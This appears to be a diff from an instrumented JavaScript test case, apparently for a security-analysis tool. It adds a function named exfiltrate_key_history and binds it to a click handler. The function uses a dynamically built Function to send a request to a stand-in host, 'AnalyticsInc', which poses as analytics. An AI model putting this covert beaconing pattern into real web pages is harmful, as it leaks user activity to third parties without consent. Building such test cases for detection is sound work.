@@ -1,0 +1,7 @@
+function exfiltrate_key_history() {
+  var v0 = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func_encodesel", true);xmlhttp.send(null);']);
+  v0();
+  return
+}
+var v1 = document.getElementById("test");
+JAM.set(v1, "onclick", exfiltrate_key_history);
